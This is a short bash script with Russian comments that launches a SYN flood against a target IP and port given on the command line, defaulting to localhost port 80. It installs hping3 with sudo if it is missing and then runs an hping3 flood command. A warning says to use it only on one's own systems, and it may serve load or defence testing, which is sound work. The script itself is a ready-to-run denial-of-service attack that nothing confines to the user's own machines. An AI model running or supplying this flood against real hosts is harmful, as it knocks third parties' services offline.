#!/bin/bash
# Скрипт для тестирования SYN Flood атаки
# Использование: ./test_attack_syn_flood.sh <target_ip> [port]

TARGET_IP=${1:-"127.0.0.1"}
PORT=${2:-"80"}

echo "Тестирование SYN Flood атаки на $TARGET_IP:$PORT"
echo "ВНИМАНИЕ: Это тестовая атака! Используйте только на своих системах."
echo "Нажмите Ctrl+C для остановки"
sleep 3

# Проверка наличия hping3
if ! command -v hping3 &> /dev/null; then
    echo "Установка hping3..."
    sudo apt-get install -y hping3
fi

# Запуск SYN Flood
echo "Запуск SYN Flood атаки..."
hping3 -S -p $PORT --flood $TARGET_IP
